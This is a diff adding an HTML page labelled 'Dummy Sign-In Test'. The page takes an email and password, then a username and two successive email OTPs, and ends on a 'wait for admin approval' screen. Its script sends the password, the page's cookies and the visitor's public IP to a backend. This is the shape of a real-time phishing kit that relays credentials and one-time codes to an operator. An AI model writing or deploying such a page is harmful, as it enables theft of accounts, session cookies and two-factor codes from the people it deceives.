@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Dummy Sign-In Test</title>
+  <meta charset="UTF-8">
+  <style>
+    .password-wrapper {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .password-wrapper input { padding: 4px 6px; }
+    .toggle-password {
+      cursor: pointer;
+      font-size: 18px;
+      user-select: none;
+      background: none;
+      border: none;
+      padding: 0;
+      line-height: 1;
+    }
+    .error { color: red; font-weight: bold; }
+    .success { color: green; }
+  </style>
+</head>
+<body>
+
+  <h1>Dummy Sign-In</h1>
+
+  <!-- Step 1: Email + Password -->
+  <div id="step1">
+    <h2>Step 1: Email and Password</h2>
+    <form id="form1">
+      <label>Email: <input type="email" id="email" required></label><br><br>
+      <label>Password:
+        <span class="password-wrapper">
+          <input type="password" id="password" required>
+          <button type="button" class="toggle-password" id="togglePassword" title="Show password">👁️</button>
+        </span>
+      </label><br><br>
+      <button type="submit">Continue</button>
+    </form>
+    <p id="status1"></p>
+  </div>
+
+  <!-- Step 2: Username -->
+  <div id="step2" style="display:none;">
+    <h2>Step 2: Username</h2>
+    <form id="form2">
+      <label>Username: <input type="text" id="username" required></label><br><br>
+      <button type="submit">Continue</button>
+    </form>
+    <p id="status2"></p>
+  </div>
+
+  <!-- Step 3: OTP 1 -->
+  <div id="step3" style="display:none;">
+    <h2>Step 3: OTP 1</h2>
+    <p>A 6-digit OTP has been sent to your email.</p>
+    <form id="form3">
+      <label>OTP 1: <input type="text" id="otp1" required maxlength="6"></label><br><br>
+      <button type="submit">Continue</button>
+    </form>
+    <p id="status3"></p>
+  </div>
+
+  <!-- Step 4: OTP 2 -->
+  <div id="step4" style="display:none;">
+    <h2>Step 4: OTP 2</h2>
+    <p>A second 6-digit OTP has been sent to your email.</p>
+    <form id="form4">
+      <label>OTP 2: <input type="text" id="otp2" required maxlength="6"></label><br><br>
+      <button type="submit">Submit</button>
+    </form>
+    <p id="status4"></p>
+  </div>
+
+  <!-- Waiting -->
+  <div id="waiting" style="display:none;">
+    <h2>Please wait for admin’s approval</h2>
+    <p>Your information has been sent to the administrator.</p>
+    <p>Please wait while the admin reviews your dummy sign-in request...</p>
+    <p>Loading...</p>
+  </div>
+
+  <script>
+    let sessionId = null;
+    let userIp = '(fetching...)';
+
+    // Get public IP
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(j => { userIp = j.ip || '(unknown)'; })
+      .catch(() => { userIp = '(could not detect)'; });
+
+    // Password eye toggle
+    document.getElementById('togglePassword').addEventListener('click', function() {
+      const input = document.getElementById('password');
+      const btn = this;
+      if (input.type === 'password') {
+        input.type = 'text';
+        btn.textContent = '🙈';
+        btn.title = 'Hide password';
+      } else {
+        input.type = 'password';
+        btn.textContent = '👁️';
+        btn.title = 'Show password';
+      }
+    });
+
+    function showStatus(id, message, isError) {
+      const el = document.getElementById(id);
+      el.textContent = message;
+      el.className = isError ? 'error' : (message.includes('sent') || message.includes('correct') ? 'success' : '');
+    }
+
+    // Step 1
+    document.getElementById('form1').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      showStatus('status1', 'Sending Email + Password and generating OTP...');
+
+      try {
+        const res = await fetch('/api/step1', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email,
+            password,
+            cookies: document.cookie || '(no cookies)',
+            ip: userIp
+          })
+        });
+        const data = await res.json();
+
+        if (data.success) {
+          sessionId = data.sessionId;
+          showStatus('status1', data.message);
+          document.getElementById('step1').style.display = 'none';
+          document.getElementById('step2').style.display = 'block';
+        } else {
+          showStatus('status1', data.message || 'Error', true);
+        }
+      } catch (err) {
+        showStatus('status1', 'Network error. Is the server running?', true);
+      }
+    });
+
+    // Step 2
+    document.getElementById('form2').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const username = document.getElementById('username').value;
+
+      showStatus('status2', 'Sending Username...');
+
+      try {
+        const res = await fetch('/api/step2', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId, username })
+        });
+        const data = await res.json();
+
+        if (data.success) {
+          showStatus('status2', data.message);
+          document.getElementById('step2').style.display = 'none';
+          document.getElementById('step3').style.display = 'block';
+        } else {
+          showStatus('status2', data.message || 'Error', true);
+        }
+      } catch (err) {
+        showStatus('status2', 'Network error', true);
+      }
+    });
+
+    // Step 3 – OTP 1
+    document.getElementById('form3').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const otp1 = document.getElementById('otp1').value.trim();
+
+      showStatus('status3', 'Verifying OTP 1...');
+
+      try {
+        const res = await fetch('/api/step3', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId, otp1 })
+        });
+        const data = await res.json();
+
+        if (data.success) {
+          showStatus('status3', data.message);
+          document.getElementById('step3').style.display = 'none';
+          document.getElementById('step4').style.display = 'block';
+        } else {
+          showStatus('status3', data.message, true);
+        }
+      } catch (err) {
+        showStatus('status3', 'Network error', true);
+      }
+    });
+
+    // Step 4 – OTP 2
+    document.getElementById('form4').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const otp2 = document.getElementById('otp2').value.trim();
+
+      showStatus('status4', 'Verifying OTP 2...');
+
+      try {
+        const res = await fetch('/api/step4', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId, otp2 })
+        });
+        const data = await res.json();
+
+        if (data.success) {
+          showStatus('status4', data.message);
+          document.getElementById('step4').style.display = 'none';
+          document.getElementById('waiting').style.display = 'block';
+        } else {
+          showStatus('status4', data.message, true);
+        }
+      } catch (err) {
+        showStatus('status4', 'Network error', true);
+      }
+    });
+  </script>
+
+</body>
+</html>
